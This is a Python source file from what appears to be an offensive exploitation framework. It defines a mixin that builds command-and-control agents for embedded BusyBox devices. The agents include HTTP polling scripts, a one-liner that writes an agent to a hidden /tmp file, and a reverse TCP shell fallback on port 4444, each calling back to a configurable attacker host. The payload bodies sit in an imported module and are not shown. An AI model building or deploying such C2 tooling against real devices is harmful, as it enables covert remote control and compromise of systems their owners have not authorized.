#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Embedded C2 helpers — inherit ``EmbeddedC2Mixin`` in post/payload modules."""

from __future__ import annotations

from typing import Any, Dict

from lib.c2.embedded_http_agent import (
    build_embedded_http_agent_oneliner,
    build_embedded_http_agent_script,
    build_embedded_reverse_tcp_fallback,
)


class EmbeddedC2Mixin:
    """Build/deploy BusyBox HTTP polling agents from module options."""

    def _emb_opt(self, name: str, default=None):
        attr = getattr(self, name, default)
        if hasattr(attr, "value"):
            attr = attr.value
        return attr if attr is not None else default

    def get_embedded_c2_options(self) -> Dict[str, Any]:
        return {
            "host": str(
                self._emb_opt("lhost")
                or self._emb_opt("callback_host")
                or self._emb_opt("rhost")
                or "127.0.0.1"
            ).strip(),
            "port": int(self._emb_opt("lport") or self._emb_opt("callback_port") or 8088),
            "client_id": str(self._emb_opt("client_id") or "").strip(),
            "url_prefix": str(self._emb_opt("url_prefix") or "/c2"),
            "poll_interval": float(self._emb_opt("poll_interval") or 10),
            "use_ssl": bool(self._emb_opt("ssl") or self._emb_opt("use_ssl") or False),
            "path": str(self._emb_opt("agent_path") or "/tmp/.ks_emb_c2.sh"),
        }

    def build_embedded_http_agent(self, client_id: str = "") -> str:
        opts = self.get_embedded_c2_options()
        cid = str(client_id or opts["client_id"] or "emb-agent")
        return build_embedded_http_agent_script(
            opts["host"],
            opts["port"],
            cid,
            url_prefix=opts["url_prefix"],
            poll_interval=opts["poll_interval"],
            use_ssl=opts["use_ssl"],
        )

    def build_embedded_http_oneliner(self, client_id: str = "") -> str:
        opts = self.get_embedded_c2_options()
        cid = str(client_id or opts["client_id"] or "emb-agent")
        return build_embedded_http_agent_oneliner(
            opts["host"],
            opts["port"],
            cid,
            url_prefix=opts["url_prefix"],
            poll_interval=opts["poll_interval"],
            use_ssl=opts["use_ssl"],
            path=opts["path"],
        )

    def build_embedded_tcp_fallback(self) -> str:
        opts = self.get_embedded_c2_options()
        return build_embedded_reverse_tcp_fallback(opts["host"], int(self._emb_opt("tcp_port") or 4444))
